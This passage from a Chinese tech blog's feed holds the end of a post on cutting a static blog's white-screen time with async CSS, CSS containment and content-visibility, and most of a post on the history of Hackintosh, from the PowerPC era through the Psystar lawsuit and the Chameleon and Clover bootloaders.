秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 